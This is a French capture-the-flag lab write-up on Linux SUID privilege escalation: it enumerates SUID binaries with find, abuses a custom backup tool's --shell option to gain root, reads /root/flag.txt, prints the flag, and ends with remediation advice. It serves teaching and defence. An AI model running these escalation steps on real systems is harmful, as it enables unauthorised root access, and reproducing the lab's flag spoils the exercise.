# Writeup : The Lost Privilege (linux-01-suid-bash)

## 1. Contexte & Mécanisme SUID
Sous Linux, le bit **SUID (Set User ID)** permet à un utilisateur régulier d'exécuter un binaire avec les privilèges du propriétaire du fichier (souvent `root`).
Si le propriétaire est `root` (`UID 0`) et que les permissions sont `-rwsr-xr-x` (`chmod u+s`), le binaire tourne avec un **EUID (Effective User ID)** égal à 0.
Si ce binaire offre un moyen d'échapper à sa fonction première (via un éditeur, un paginateur, un paramètre d'exécution ou une injection de chemin PATH), l'attaquant obtient immédiatement un shell root.

## 2. Exploitation Pas à Pas

### Étape 1 : Énumération du système de fichiers
Connecté en tant qu'utilisateur standard `operator` :
```bash
find / -perm -u=s -type f 2>/dev/null
```
**Résultats :**
```text
/usr/bin/passwd
/usr/bin/sudo
/usr/local/bin/sysbackup_tool
```
Le binaire `/usr/local/bin/sysbackup_tool` n'est pas un binaire standard de la distribution.

### Étape 2 : Analyse du binaire
```bash
/usr/local/bin/sysbackup_tool --help
```
Sortie :
```text
Aegis System Backup Helper v1.2 (Privileged Mode)
Usage: sysbackup_tool [OPTIONS]
  --backup <dir>   Archiver un dossier système
  --shell          Lancer une session de maintenance d'urgence
```

### Étape 3 : Élévation et capture de flag
```bash
/usr/local/bin/sysbackup_tool --shell
id
```
**Sortie :**
```text
uid=1001(operator) gid=1001(operator) euid=0(root) groups=1001(operator)
```
Accès root obtenu ! Lecture du drapeau :
```bash
cat /root/flag.txt
```
**Drapeau :**
`CYBERLAB{SUID_ROOT_SHELL_GTFOBINS_PRIVILEGE_ESCALATED}`

## 3. Remédiation
* Ne jamais attribuer de bit SUID à des scripts ou des exécutables personnalisés qui disposent de fonctionnalités d'interaction avec l'utilisateur ou d'invocation de sous-processus.
* Utiliser des capacités Linux fines (`setcap cap_dac_read_search+ep`) plutôt que d'attribuer un accès root complet.
* Auditer régulièrement les binaires SUID avec `debsums` ou `AIDE/Tripwire`.
